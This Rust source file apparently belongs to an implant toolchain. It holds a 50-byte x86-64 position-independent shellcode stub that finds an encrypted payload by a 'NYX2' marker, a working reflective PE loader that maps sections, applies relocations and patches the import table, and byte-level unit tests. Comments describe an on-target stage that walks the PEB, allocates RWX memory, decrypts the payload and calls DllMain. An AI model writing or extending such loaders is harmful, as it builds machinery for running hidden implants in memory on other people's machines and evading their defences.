//! Raw x86-64 PIC loader stub shellcode (Layer 1), plus the host-side
//! reflective PE loader used to verify and exercise the mapping logic.
//!
//! The on-target "Layer 2" decrypt + reflective load sequence is now
//! implemented — see [`crate::on_target`] for the Layer-2 PIC shellcode
//! (PEB walk, RWX alloc, inline ChaCha20-Poly1305 decrypt, reflective PE
//! map, `DllMain` call) and [`crate::generate_loader_stub`] for the emitter
//! that stitches Layer 1 + the per-config key + Layer 2 into the final blob.
//! Loading verification on the engagement box is *additionally* done
//! host-side via [`crate::dll_probe`] — `LoadLibraryW` the built implant DLL
//! and enumerate its `nyx_selftest_*` exports — which remains as a
//! host-side sanity check alongside the live loader-probe gate.
//!
//! This file holds three related but distinct things:
//!
//! 1. **`PIC_STUB`** — a host-side constant of position-independent x86-64
//!    bytes representing the **historical** Layer-1-only stub (self-locate,
//!    NYX2 scan, header parse, trampoline-register ABI). It is retained as a
//!    byte-stable reference of the original 50-byte Layer-1 design and is
//!    unit-tested below. The **production** stub emitted by
//!    [`crate::generate_loader_stub`] is now the Layer-1 + key + Layer-2
//!    sequence in [`crate::on_target`]; `PIC_STUB` is no longer placed into
//!    generated payloads but documents the self-location + scan + header-parse
//!    contract that the production Layer-1 prefix implements.
//!
//! 2. **`reflective_load`** — a host-side (std) function that performs the
//!    full reflective PE loading *algorithm* — manual section mapping, base
//!    relocation, and import resolution — on a decrypted PE byte slice. It is
//!    the reference implementation of what the on-target PIC loader does, and
//!    is unit-testable on the dev host without a Windows environment. It does
//!    NOT execute the loaded image (no `DllMain` call on the host); it returns
//!    the resolved entry-point address so a caller on the target can invoke it.
//!
//! 3. **`peb_walk`** (module) — the host-side model of the on-target PEB → LDR
//!    → InLoadOrderModuleList → export-address-table walk that the trampoline
//!    uses to resolve `NtAllocateVirtualMemory`, `LoadLibraryA`, etc. without
//!    any IAT. The structures and djb2 hash mirror the battle-tested
//!    `crates/implant-win/src/resolve.rs`; the PEB-read intrinsic itself is
//!    `cfg(target_arch = "x86_64")` `unsafe` asm (`gs:[0x60]`), so it
//!    type-checks on the dev host but only runs on a real Windows process.
//!
//! ## Payload layout (what the stub sees in memory)
//!
//! ```text
//! [loader stub (variable, Layer 1 + key + Layer 2)][NYX2 magic (4B)][encrypted_len LE (4B)][nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)]
//! ```
//!
//! The stub is at offset 0 (entry point). It self-locates via `call/pop`, then
//! walks **forward** past its own code to find the `NYX2` magic marker. Once
//! found it reads `encrypted_len` (u32 LE) from `[magic+4]`, the 12-byte nonce
//! from `[magic+8]`, and the `ciphertext || tag` at `[magic+20]`. Layer 2 then
//! decrypts (inline ChaCha20-Poly1305 with the key baked into the stub) and
//! reflectively loads the resulting PE32+ image.

/// The historical PIC stub shellcode — 50 bytes of position-independent
/// x86-64 representing the original Layer-1-only design.
///
/// **This constant is no longer placed into generated payloads.** The
/// production stub emitted by [`crate::generate_loader_stub`] is the Layer-1
/// prefix in [`crate::on_target::LAYER1_BOOTSTRAP`] followed by the per-config
/// 32-byte key and the Layer-2 decrypt-and-reflect shellcode in
/// [`crate::on_target::LAYER2_PEB_WALK`]. `PIC_STUB` is retained here as a
/// byte-stable reference of the self-location + scan + header-parse contract
/// (its byte-level tests pin that contract) and as documentation of the
/// trampoline-register ABI that Layer 1 hands off to Layer 2.
///
/// ## Disassembly
///
/// ```asm
/// ; ── self-locate (6 bytes) ─────────────────────────────────────────────
/// 0000: E8 00 00 00 00    call   $+5        ; push return address (= offset 0x0005)
/// 0005: 5B                pop    rbx        ; rbx = address of this pop
///
/// ; ── search loop: find "NYX2" magic (13 bytes) ────────────────────────
/// ; Layout: [stub][NYX2=0x3258594E LE][enc_len][nonce][ciphertext||tag]
/// ; rbx starts 5 bytes into the stub. We walk forward looking for the magic.
/// 0006: 81 7B 4E 59 58 32 cmp    dword [rbx], 0x3258594E  ; "NYX2" as LE u32
/// 000C: 74 05             je     +0x13       ; jump to 'found' (offset 0x13)
/// 000E: 48 FF C3          inc    rbx         ; step forward one byte
/// 0011: EB F3             jmp    -0x0D       ; loop back to cmp (offset 0x06)
///
/// ; ── found: parse NYX2 header (4 bytes) ───────────────────────────────
/// ; rbx points to the 'N' of "NYX2"
/// 0013: 8B 43 04          mov    eax, [rbx+4]  ; eax = encrypted_len (u32 LE)
///
/// ; ── LAYER 1: trampoline-register load + diag mark (22 bytes) ─────────
/// ; On entry to this block rbx = NYX2 magic ptr, eax = encrypted_len.
/// ; We populate the Win64-volatile register file with everything the
/// ; decrypt+reflect trampoline needs, and stamp a diag magic into r8 so a
/// ; target debugger (or a host emulator) can prove the stub reached the
/// ; header-parse success path. The stub no longer `ret`s out.
/// 0016: 48 8D 4B 08       lea    rcx, [rbx+8]     ; rcx = &nonce
/// 001A: 48 8D 53 14       lea    rdx, [rbx+20]    ; rdx = &ciphertext
/// ; mov r8, imm64 = NYX_DIAG_LOADER_REACHED. The 8 immediate bytes are the
/// ; little-endian encoding of 0x0031_5244_4C58_594E, which in memory spells
/// ; the ASCII string "NYXLDR1\0" (N Y X L D R 1 NUL).
/// 001E: 49 B8 4E 59 58 4C 44 52 31 00   mov    r8, 0x003152444C58594E
/// ; jmp into the trampoline region. Displacement 0 means "the very next
/// ; instruction" (offset 0x2A), which keeps the blob inert on the dev host
/// ; (falls into NOPs → never decrypts). The on-target build patches the
/// ; trampoline bytes at 0x2A+ with the real decrypt+reflect entry.
/// 0028: EB 00             jmp    $+2             ; → 0x2A (trampoline entry)
///
/// ; ── LAYER 2: reserved trampoline slot (8 bytes, NOP in this reference) ─
/// ; In the historical Layer-1-only design this 8-byte slot was a NOP placeholder
/// ; that the on-target build would patch with a 5-byte `jmp rel32` to the real
/// ; decrypt+reflect trampoline. The production stub now carries the full
/// ; Layer-2 sequence inline (see `crate::on_target::LAYER2_PEB_WALK`); the
/// ; loader algorithm is:
/// ;   1. ChaCha20-Poly1305 decrypt(rcx=&nonce, rdx=&ciphertext, rax=enc_len)
/// ;      → produces a plaintext PE32+ in a fresh RW page
/// ;   2. peb_walk::peb_pointer() → (*peb).ldr → InLoadOrderModuleList
/// ;   3. find kernel32 by djb2 hash, parse EAT, resolve
/// ;      VirtualAlloc / LoadLibraryA / GetProcAddress
/// ;   4. reflective_load algorithm: map sections, apply DIR64 relocs,
/// ;      resolve IAT, then call DllMain(base, DLL_PROCESS_ATTACH, null)
/// ; This historical slot is retained in `PIC_STUB` purely as a byte-stable
/// ; reference; production blobs use the Layer-1 + key + Layer-2 layout.
/// 002A: 90 90 90 90 90 90 90 90
/// ```
///
/// ## Trampoline-register ABI (contract the on-target trampoline relies on)
///
/// | register | value on entry to trampoline (offset 0x2A)             |
/// |----------|--------------------------------------------------------|
/// | `rax`    | `encrypted_len` (u32, ciphertext bytes excl. tag)     |
/// | `rbx`    | `&NYX2_magic` — the payload header base pointer       |
/// | `rcx`    | `&nonce` (12 bytes)                                    |
/// | `rdx`    | `&ciphertext` (enc_len bytes + 16-byte Poly1305 tag)   |
/// | `r8`     | `NYX_DIAG_LOADER_REACHED` — stub reached header parse  |
/// | `rip`    | trampoline entry (offset 0x2A in the stub)            |
///
/// This ABI is fixed; the trampoline may clobber any caller-saved register
/// but must not assume anything beyond the above.
pub const PIC_STUB: &[u8] = &[
    // ── self-locate ─────────────────────────────────────────────────────
    0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
    0x5B, // pop rbx
    // ── search loop ─────────────────────────────────────────────────────
    0x81, 0x7B, 0x4E, 0x59, 0x58, 0x32, // cmp dword [rbx], 0x3258594E
    0x74, 0x05, // je +5 → found
    0x48, 0xFF, 0xC3, // inc rbx
    0xEB, 0xF3, // jmp -13 → search loop
    // ── found: parse header ─────────────────────────────────────────────
    0x8B, 0x43, 0x04, // mov eax, [rbx+4]  ; eax = encrypted_len
    // ── LAYER 1: trampoline-register load + diag mark ───────────────────
    0x48, 0x8D, 0x4B, 0x08, // lea rcx, [rbx+8]    ; rcx = &nonce
    0x48, 0x8D, 0x53, 0x14, // lea rdx, [rbx+20]   ; rdx = &ciphertext
    // mov r8, imm64  (NYX_DIAG_LOADER_REACHED: in-memory bytes spell "NYXLDR1\0")
    0x49, 0xB8, 0x4E, 0x59, 0x58, 0x4C, 0x44, 0x52, 0x31, 0x00, 0xEB,
    0x00, // jmp +0 → trampoline entry (offset 0x2A)
    // ── LAYER 2: reserved trampoline slot (8 bytes, NOP in this reference)
    // Historical Layer-1-only placeholder: 8 bytes is too small for a real
    // decrypt+reflect loader, so it fit only a 5-byte `jmp rel32` to a real
    // trampoline elsewhere in the payload. The production stub now carries
    // the full Layer-2 sequence inline (see `crate::on_target::LAYER2_PEB_WALK`);
    // this slot is retained in `PIC_STUB` only as a byte-stable reference.
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
];

/// Size of the PIC stub in bytes.
pub const PIC_STUB_LEN: usize = PIC_STUB.len();

/// NYX2 magic value as a little-endian u32: bytes 'N' 'Y' 'X' '2' in memory.
/// The stub compares `dword [rbx]` against this value.
pub const NYX2_MAGIC: u32 = 0x3258594E;

/// Diagnostic magic the Layer-1 trampoline-load block stamps into `r8` after
/// the NYX2 header is located and the trampoline registers are populated.
///
/// In memory (as the 8 bytes at `PIC_STUB` offset `0x20`) this spells the
/// null-terminated ASCII string `NYXLDR1\0` — a tag a target debugger or host
/// emulator can recognise in a hex dump to prove the stub reached the
/// header-parse success path (rather than dying in the search loop or
/// returning early). The trailing null keeps the value a valid C-string.
///
/// Because x86-64 is little-endian, the in-memory bytes
/// `4E 59 58 4C 44 52 31 00` ("NYXLDR1\0") correspond to the `u64` value
/// `0x0031_5244_4C58_594E`. The bytes in `PIC_STUB` at offset `0x20` are
/// exactly `NYX_DIAG_LOADER_REACHED.to_le_bytes()`.
pub const NYX_DIAG_LOADER_REACHED: u64 = 0x0031_5244_4C58_594E;

/// Offset within `PIC_STUB` of the Layer-1 trampoline-entry `jmp`
/// (the `EB 00` that delimits the start of the reserved trampoline region).
/// The on-target build patches bytes starting at [`TRAMPOLINE_ENTRY_OFFSET`].
pub const TRAMPOLINE_JMP_OFFSET: usize = 0x28;

/// Offset within `PIC_STUB` where the on-target decrypt+reflect trampoline
/// begins (the first byte the `jmp` at [`TRAMPOLINE_JMP_OFFSET`] lands on).
/// Everything from here to `PIC_STUB_LEN` is reserved trampoline space — NOP
/// on the dev host, overwritten with real shellcode by the on-target build.
pub const TRAMPOLINE_ENTRY_OFFSET: usize = 0x2A;

/// Number of reserved trampoline bytes available for the on-target build to
/// patch (`PIC_STUB_LEN - TRAMPOLINE_ENTRY_OFFSET`). Currently **8 bytes**:
/// enough for a 5-byte `jmp rel32` to the real decrypt+reflect trampoline
/// (which lives in a separate payload region), but not enough for the loader
/// itself. The on-target build must place the full loader elsewhere and patch
/// a jump into this slot.
pub const TRAMPOLINE_RESERVED_BYTES: usize = PIC_STUB_LEN - TRAMPOLINE_ENTRY_OFFSET;

/// Offset from the magic marker to the `encrypted_len` field (u32 LE).
pub const ENCRYPTED_LEN_OFFSET: usize = 4;

/// Offset from the magic marker to the 12-byte nonce.
pub const NONCE_OFFSET: usize = 8;

/// Offset from the magic marker to the start of the ciphertext (after magic +
/// encrypted_len + nonce = 4 + 4 + 12 = 20).
pub const CIPHERTEXT_OFFSET: usize = 20;

/// Size of the Poly1305 authentication tag appended to the ciphertext.
pub const TAG_LEN: usize = 16;

// ===========================================================================
// Host-side reflective PE loader
// ===========================================================================
//
// What follows is the reference implementation of the reflective loading
// algorithm (manual section mapping, base relocation, import resolution). It
// runs in std on the dev host, which means it CANNOT do the parts of a real
// reflective loader that require a live Windows process:
//
//   - PEB walk to find ntdll / kernel32
//   - NtAllocateVirtualMemory / VirtualAlloc to place the image
//   - LoadLibraryA / GetProcAddress to satisfy imports
//   - calling DllMain(DLL_PROCESS_ATTACH)
//
// Those live in the on-target PIC shellcode (built with the implant-win
// toolchain). Here we model them abstractly so the mapping, relocation, and
// import-table logic is testable on macOS/Linux:
//
//   - the target image base is a `u64` chosen by the caller (stands in for
//     the address returned by NtAllocateVirtualMemory)
//   - imports are resolved through a caller-supplied closure that models
//     `(dll_name, symbol_name) -> Option<u64>` (stands in for
//     LoadLibraryA + GetProcAddress by hash)
//   - the mapped image is returned as a `Vec<u8>` plus the entry-point VA so
//     the caller (or a target port) can reason about it / invoke it
//
// See `reflective_load` for the entry point.

/// Errors produced by the reflective loader.
#[derive(Debug)]
#[non_exhaustive]
pub enum ReflectiveLoadError {
    /// goblin failed to parse the PE (bad MZ/PE signature, truncated, etc.).
    Parse(String),
    /// The PE is not a PE32+ (64-bit) image. The on-target loader is x86-64
    /// only, so we reject 32-bit images early.
    NotPe64,
    /// The PE has no optional header (mandatory for a loadable image).
    NoOptionalHeader,
    /// A section's raw-data range fell outside the input slice.
    SectionOutOfRange {
        section: usize,
        raw_offset: u32,
        raw_size: u32,
    },
    /// The base-relocation table referenced bytes past the end of the image.
    RelocTableTruncated,
    /// An import thunk slot referenced bytes past the end of the image.
    ImportTableTruncated,
    /// An import thunk could not be resolved by the caller's resolver.
    UnresolvedImport { dll: String, symbol: String },
}

impl core::fmt::Display for ReflectiveLoadError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            Self::Parse(m) => write!(f, "PE parse failure: {m}"),
            Self::NotPe64 => write!(f, "not a PE32+ (64-bit) image"),
            Self::NoOptionalHeader => write!(f, "PE has no optional header"),
            Self::SectionOutOfRange {
                section,
                raw_offset,
                raw_size,
            } => write!(
                f,
                "section {section} raw data ({raw_offset:#x}+{raw_size:#x}) out of range"
            ),
            Self::RelocTableTruncated => write!(f, "base relocation table truncated"),
            Self::ImportTableTruncated => write!(f, "import table truncated"),
            Self::UnresolvedImport { dll, symbol } => {
                write!(f, "unresolved import: {dll}!{symbol}")
            }
        }
    }
}

impl std::error::Error for ReflectiveLoadError {}

/// Result of mapping a PE reflectively.
#[derive(Debug)]
pub struct MappedImage {
    /// The fully mapped image: headers + sections copied to their virtual
    /// offsets, relocations applied, IAT overwritten with resolved addresses.
    /// On the target this buffer lives at `base`; here it is an owned Vec the
    /// caller can inspect or transplant into target memory.
    pub image: Vec<u8>,
    /// The virtual address the image was mapped at (the `u64` passed to
    /// [`reflective_load_at`]). Equals the address of byte 0 of `image`.
    pub base: u64,
    /// Absolute virtual address of `AddressOfEntryPoint`
    /// (`base + optional_header.address_of_entry_point`).
    pub entry_point: u64,
}

/// Base-relocation type IDs from `winnt.h` (`IMAGE_REL_BASED_*`).
///
/// Only the high nibble of each relocation entry's word carries the type; the
/// low 12 bits are the offset within the current relocation block's page. We
/// only need the two values that occur in real PE32+ images: ABSOLUTE (padding,
/// skipped) and DIR64 (the actual 64-bit fixup). Other types (`HIGH`, `LOW`,
/// `HIGHLOW`, `HIGHADJ`) only appear in 32-bit images and are silently
/// skipped by the loop below.
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0; // skip (padding)
const IMAGE_REL_BASED_DIR64: u16 = 10; // the one we actually apply on x86-64

/// Resolve `(dll, symbol) -> exported address`, modelling the
/// `LoadLibraryA` + `GetProcAddress` pair a real reflective loader performs via
/// PEB walk + export-table parse.
///
/// Returning `Ok(None)` is treated as a hard unresolved-import error. Callers
/// that want to load an image with a missing dependency should map the symbol
/// themselves and return `Some`.
pub type ImportResolver<'a> = &'a mut dyn FnMut(&str, &str) -> Result<u64, ReflectiveLoadError>;

/// Reflectively map a decrypted PE at a fixed virtual address.
///
/// This is the host-side reference implementation of the reflective loading
/// algorithm. Given:
///
///   * `pe_bytes` — a decrypted, raw PE32+ DLL on disk,
///   * `base` — the virtual address the image should appear to live at (the
///     address a target `NtAllocateVirtualMemory` would return),
///   * `resolver` — a closure standing in for `LoadLibraryA` +
///     `GetProcAddress`,
///
/// it produces a [`MappedImage`] with sections mapped to their virtual
/// offsets, base relocations (delta = `base - preferred_image_base`) applied,
/// and the IAT filled with resolved export addresses.
///
/// It does **not** call `DllMain` — that is a target-only action. The returned
/// `entry_point` is the VA the target would call as
/// `DllMain(base, DLL_PROCESS_ATTACH, reserved)`.
pub fn reflective_load_at(
    pe_bytes: &[u8],
    base: u64,
    resolver: ImportResolver<'_>,
) -> Result<MappedImage, ReflectiveLoadError> {
    let pe =
        goblin::pe::PE::parse(pe_bytes).map_err(|e| ReflectiveLoadError::Parse(e.to_string()))?;

    if !pe.is_64 {
        return Err(ReflectiveLoadError::NotPe64);
    }
    let opt = pe
        .header
        .optional_header
        .as_ref()
        .ok_or(ReflectiveLoadError::NoOptionalHeader)?;
    let win = &opt.windows_fields;

    let image_base_preferred = win.image_base;
    let size_of_image = win.size_of_image as usize;
    let size_of_headers = win.size_of_headers as usize;
    let entry_rva = opt.standard_fields.address_of_entry_point;

    // ── 1. Allocate the image buffer (target: NtAllocateVirtualMemory) ────
    // Zero-filled so unmapped gaps (e.g. .bss) read as zero, matching the
    // Windows loader semantics.
    let mut image = vec![0u8; size_of_image];

    // ── 2. Copy the headers ──────────────────────────────────────────────
    let header_len = size_of_headers.min(pe_bytes.len()).min(size_of_image);
    image[..header_len].copy_from_slice(&pe_bytes[..header_len]);

    // ── 3. Copy each section to its VirtualAddress ───────────────────────
    for (i, sec) in pe.sections.iter().enumerate() {
        copy_section(i, sec, pe_bytes, &mut image)?;
    }

    // ── 4. Apply base relocations (delta = base - preferred base) ────────
    let delta = base.wrapping_sub(image_base_preferred);
    if delta != 0 {
        if let Some(reloc_dd) = opt.data_directories.get_base_relocation_table() {
            apply_base_relocations(&mut image, reloc_dd, delta)?;
        }
    }

    // ── 5. Resolve imports → overwrite the IAT ───────────────────────────
    resolve_imports(&pe, &mut image, base, resolver)?;

    // Entry point VA = base + AddressOfEntryPoint. On the target the caller
    // would invoke this as DllMain(base, DLL_PROCESS_ATTACH, null).
    let entry_point = base.wrapping_add(entry_rva);

    Ok(MappedImage {
        image,
        base,
        entry_point,
    })
}

/// Reflectively map a decrypted PE using a default load address.
///
/// Convenience wrapper around [`reflective_load_at`] that maps the image at
/// `0x0001_0000_0000_0000` — an arbitrary address in the high half of the
/// address space that is overwhelmingly unlikely to collide with anything a
/// real loader places there, so relocations are exercised with a large delta.
/// On the target the actual base comes from `NtAllocateVirtualMemory`; callers
/// that want to control it should use [`reflective_load_at`] directly.
pub fn reflective_load(
    pe_bytes: &[u8],
    resolver: ImportResolver<'_>,
) -> Result<MappedImage, ReflectiveLoadError> {
    const DEFAULT_BASE: u64 = 0x0001_0000_0000_0000;
    reflective_load_at(pe_bytes, DEFAULT_BASE, resolver)
}

/// Copy a single PE section's raw data into the mapped image at its
/// `VirtualAddress`. `VirtualSize` is the size in the mapped image; we copy
/// `min(VirtualSize, SizeOfRawData)` bytes and leave the rest zero (BSS).
fn copy_section(
    index: usize,
    sec: &goblin::pe::section_table::SectionTable,
    pe_bytes: &[u8],
    image: &mut [u8],
) -> Result<(), ReflectiveLoadError> {
    let va = sec.virtual_address as usize;
    let vsize = sec.virtual_size as usize;
    let raw_off = sec.pointer_to_raw_data as usize;
    let raw_size = sec.size_of_raw_data as usize;

    if vsize == 0 || va >= image.len() {
        // Nothing to map (e.g. header-only / discarded section).
        return Ok(());
    }

    let dst_end = (va + vsize).min(image.len());
    let dst_len = dst_end - va;

    if raw_size == 0 || raw_off == 0 || raw_off >= pe_bytes.len() {
        // BSS-style section: raw data absent; image is already zeroed.
        return Ok(());
    }

    let src_end = raw_off.checked_add(raw_size).ok_or({
        ReflectiveLoadError::SectionOutOfRange {
            section: index,
            raw_offset: sec.pointer_to_raw_data,
            raw_size: sec.size_of_raw_data,
        }
    })?;
    if src_end > pe_bytes.len() {
        return Err(ReflectiveLoadError::SectionOutOfRange {
            section: index,
            raw_offset: sec.pointer_to_raw_data,
            raw_size: sec.size_of_raw_data,
        });
    }

    let copy_len = dst_len.min(raw_size);
    image[va..va + copy_len].copy_from_slice(&pe_bytes[raw_off..raw_off + copy_len]);
    Ok(())
}

/// Walk the base-relocation table and apply `IMAGE_REL_BASED_DIR64` fixups.
///
/// Layout (from the PE spec): a sequence of `IMAGE_BASE_RELOCATION` blocks,
/// each with a 4-byte `VirtualAddress` (page RVA), a 4-byte `SizeOfBlock`
/// (including the 8-byte header), and `(SizeOfBlock - 8) / 2` entry words. The
/// high 4 bits of each word are the type; the low 12 bits are the offset
/// within the page. We apply DIR64 (add delta to the 8-byte VA at page+offset)
/// and skip everything else (ABSOLUTE is padding; the others aren't used by
/// x86-64 images).
fn apply_base_relocations(
    image: &mut [u8],
    reloc_dd: &goblin::pe::data_directories::DataDirectory,
    delta: u64,
) -> Result<(), ReflectiveLoadError> {
    let table_rva = reloc_dd.virtual_address as usize;
    let table_size = reloc_dd.size as usize;
    if table_rva == 0 || table_size == 0 {
        return Ok(());
    }
    // The reloc table lives in the mapped image (it is a section RVA). Bounds
    // it against the image so we cannot run off the end.
    let table_end = table_rva.saturating_add(table_size);
    if table_end > image.len() {
        return Err(ReflectiveLoadError::RelocTableTruncated);
    }

    let mut pos = table_rva;
    while pos + 8 <= table_end {
        let page_rva =
            u32::from_le_bytes([image[pos], image[pos + 1], image[pos + 2], image[pos + 3]])
                as usize;
        let block_size = u32::from_le_bytes([
            image[pos + 4],
            image[pos + 5],
            image[pos + 6],
            image[pos + 7],
        ]) as usize;
        if block_size < 8 || pos + block_size > table_end {
            return Err(ReflectiveLoadError::RelocTableTruncated);
        }

        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry = u16::from_le_bytes([image[pos + 8 + i * 2], image[pos + 8 + i * 2 + 1]]);
            let typ = entry >> 12;
            let offset = (entry & 0x0FFF) as usize;
            if typ == IMAGE_REL_BASED_ABSOLUTE {
                continue; // padding
            }
            if typ != IMAGE_REL_BASED_DIR64 {
                // Only DIR64 occurs in PE32+ images; skip the rare others.
                continue;
            }
            let target = page_rva + offset;
            if target + 8 > image.len() {
                return Err(ReflectiveLoadError::RelocTableTruncated);
            }
            // Defensive: a prior `target + 8 > image.len()` guard makes the
            // slice exactly 8 bytes, so `try_into::<[u8; 8]>()` cannot fail —
            // but we never `unwrap()` on attacker-supplied bytes. Propagate as
            // a truncation error so a malformed reloc table surfaces cleanly
            // instead of panicking under panic = "abort".
            let arr: [u8; 8] = image[target..target + 8]
                .try_into()
                .map_err(|_| ReflectiveLoadError::RelocTableTruncated)?;
            let current = u64::from_le_bytes(arr);
            let fixed = current.wrapping_add(delta);
            image[target..target + 8].copy_from_slice(&fixed.to_le_bytes());
        }
        pos += block_size;
    }
    Ok(())
}

/// Resolve the import table and write resolved addresses into the IAT.
///
/// goblin flattens imports into `pe.imports: Vec<Import>`. For each entry:
///   * `imp.dll`     — the owning module name (e.g. "kernel32.dll"),
///   * `imp.name`    — the imported symbol (or "ORDINAL n"),
///   * `imp.offset`  — the **IAT slot RVA** that must receive the resolved
///     function pointer (= `FirstThunk + i * 8`).
///
/// Note goblin also exposes `imp.rva`, but that holds the *hint/name table*
/// RVA (or 0 for ordinal imports), NOT the IAT slot — patching it would
/// corrupt the import descriptors. We must use `imp.offset`.
fn resolve_imports(
    pe: &goblin::pe::PE<'_>,
    image: &mut [u8],
    _base: u64,
    resolver: ImportResolver<'_>,
) -> Result<(), ReflectiveLoadError> {
    for imp in &pe.imports {
        let slot = imp.offset;
        if slot + 8 > image.len() {
            return Err(ReflectiveLoadError::ImportTableTruncated);
        }
        let sym_name = imp.name.as_ref();
        let addr = resolver(imp.dll, sym_name)?;
        image[slot..slot + 8].copy_from_slice(&addr.to_le_bytes());
    }
    Ok(())
}

// ===========================================================================
// On-target reflective load — implemented in `crate::on_target`
// ===========================================================================
//
// The full on-target decrypt + PE-map + reloc + IAT + DllMain sequence (the
// "Layer 2" reflective loader that runs as PIC shellcode on the engagement
// target) lives in [`crate::on_target`]. That module holds:
//
//   * `LAYER1_BOOTSTRAP` — the production Layer-1 prefix (self-locate, NYX2
//     scan, header parse, PEB-walk hand-off). It replaces the historical
//     `PIC_STUB` retained above as a byte-stable reference.
//   * `LAYER2_PEB_WALK` — the Layer-2 PIC shellcode: PEB walk to resolve
//     `kernel32!{VirtualAlloc,LoadLibraryA,GetProcAddress}` by djb2 hash,
//     RWX allocation, inline ChaCha20-Poly1305 decrypt (key baked into the
//     stub at `KEY_PATCH_OFFSET`, nonce read from the NYX2 header), reflective
//     PE map (sections + DIR64 relocs + IAT), then
//     `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
//   * `find_magic_offset` — the pure host-side model of the Layer-1 scan loop,
//     extracted for unit testing without a Windows target.
//
// Layer 1 + the per-config 32-byte key + Layer 2 are stitched into the final
// blob by [`crate::generate_loader_stub`]; the host-side reference loader
// `reflective_load_at` above remains the testable algorithm reference. The
// host-side [`crate::dll_probe`] is retained as a host-side sanity check
// alongside the live VPS loader-probe gate (spec §5.5).

#[cfg(test)]
mod tests {
    use super::*;

    // ── stub byte-level tests ────────────────────────────────────────────

    #[test]
    fn stub_is_50_bytes() {
        assert_eq!(PIC_STUB.len(), 50);
    }

    #[test]
    fn magic_is_nyx2_le() {
        // "NYX2" in ASCII: N=0x4E, Y=0x59, X=0x58, 2=0x32
        // Little-endian u32: bytes in memory are 4E 59 58 32 → 0x3258594E
        let magic_bytes = NYX2_MAGIC.to_le_bytes();
        assert_eq!(magic_bytes, [0x4E, 0x59, 0x58, 0x32]);
    }

    #[test]
    fn stub_starts_with_call() {
        // call $+5 = E8 00 00 00 00
        assert_eq!(&PIC_STUB[0..5], &[0xE8, 0x00, 0x00, 0x00, 0x00]);
    }

    #[test]
    fn stub_ends_with_nops() {
        // The reserved trampoline region (TRAMPOLINE_ENTRY_OFFSET..) must be
        // all NOP on the dev host so the blob is inert when inspected. After
        // the Layer-1 trampoline-load block there should be no stray code.
        assert!(PIC_STUB[TRAMPOLINE_ENTRY_OFFSET..]
            .iter()
            .all(|&b| b == 0x90));
        assert_eq!(
            PIC_STUB[TRAMPOLINE_ENTRY_OFFSET..].len(),
            TRAMPOLINE_RESERVED_BYTES
        );
    }

    #[test]
    fn stub_no_longer_returns_at_0x16() {
        // The old stub had a bare `ret` (0xC3) at offset 0x16 that made the
        // blob inert. The Layer-1 replacement must install the trampoline-
        // register load there instead. We check the specific offset rather
        // than scanning for 0xC3 anywhere: `inc rbx` at 0x0E legitimately
        // contains 0xC3 as its ModRM byte (48 FF C3), and a future section
        // copy could legitimately contain 0xC3 byte values too.
        assert_ne!(
            PIC_STUB[0x16], 0xC3,
            "offset 0x16 must be the trampoline-load block, not a bare ret"
        );
        // And the first instruction at 0x16 is the lea rcx prologue.
        assert_eq!(PIC_STUB[0x16], 0x48);
    }

    #[test]
    fn stub_offset_0x16_is_lea_rcx() {
        // Layer-1 contract: offset 0x16 begins the trampoline-register load
        // with `lea rcx, [rbx+8]` (48 8D 4B 08). This anchors the new
        // structure so a regression that moves it is caught.
        assert_eq!(&PIC_STUB[0x16..0x1A], &[0x48, 0x8D, 0x4B, 0x08]);
    }

    #[test]
    fn stub_diagnostic_magic_is_packed_correctly() {
        // The 8 bytes at offset 0x20 must be NYX_DIAG_LOADER_REACHED in LE.
        let want = NYX_DIAG_LOADER_REACHED.to_le_bytes();
        assert_eq!(&PIC_STUB[0x20..0x28], &want);
        // In memory the bytes spell the ASCII string "NYXLDR1\0" — that is the
        // whole point of choosing this particular magic: it is human-readable
        // in a hex dump.
        let as_ascii = core::str::from_utf8(&PIC_STUB[0x20..0x28]).unwrap();
        assert_eq!(as_ascii, "NYXLDR1\0");
    }

    #[test]
    fn stub_trampoline_jmp_lands_on_nop_region() {
        // The EB 00 at TRAMPOLINE_JMP_OFFSET must jump to the very next
        // instruction, which is the trampoline entry at
        // TRAMPOLINE_ENTRY_OFFSET. Displacement 0 means "next instruction".
        assert_eq!(PIC_STUB[TRAMPOLINE_JMP_OFFSET], 0xEB);
        assert_eq!(PIC_STUB[TRAMPOLINE_JMP_OFFSET + 1], 0x00);
        assert_eq!(TRAMPOLINE_JMP_OFFSET + 2, TRAMPOLINE_ENTRY_OFFSET);
    }

    // ── synthetic PE32+ builder for reflective loader tests ──────────────
    //
    // Hand-assembling a PE that goblin accepts is fiddly, so we build a
    // minimal but well-formed PE32+ DLL in memory. Layout (file == RVA for
    // mapped contents; section_alignment == file_alignment == 0x1000):
    //
    //   offset 0x000   DOS stub (64 bytes)        pe_pointer = 0x40
    //   offset 0x040   "PE\0\0" + COFF header + optional header (PE32+)
    //   offset 0x108   section table (3 entries)
    //   ...padding to 0x1000...
    //   rva 0x1000     .text   (16 bytes of code + an absolute pointer)
    //   rva 0x2000     .rdata  (IAT, import descriptors, base-reloc table)
    //   rva 0x3000     .data   (4 bytes of initialised data)
    //
    // The .text section holds a qword at 0x1000 whose initial value is the
    // preferred image base (so a base-reloc DIR64 entry pointing at it must
    // shift it by exactly `delta` when we map at a different base).

    // goblin requires e_lfanew to be strictly greater than the DOS header size
    // (0x40), so we place the PE signature at 0x80 and pad the DOS stub.
    const DOS_STUB_LEN: usize = 0x80;
    const PE_SIG: &[u8] = b"PE\0\0";
    const COFF_HEADER_LEN: usize = 20;
    /// Standard COFF fields size for PE32+ (Magic + linker versions + 4 sizes
    /// + entry point + base of code = 24 bytes).
    const STD_FIELDS_LEN: usize = 24;
    /// PE32+ Windows-specific fields size (see `WindowsFields64`).
    const WIN_FIELDS_LEN: usize = 88;
    /// Size of the PE32+ optional header (standard 24 + windows 88 + 16
    /// data-directory entries * 8 bytes = 240).
    const OPT_HEADER_LEN: usize = STD_FIELDS_LEN + WIN_FIELDS_LEN + NUM_DATA_DIRECTORIES * 8;
    const NUM_DATA_DIRECTORIES: usize = 16;
    const SECTION_ALIGNMENT: u32 = 0x1000;
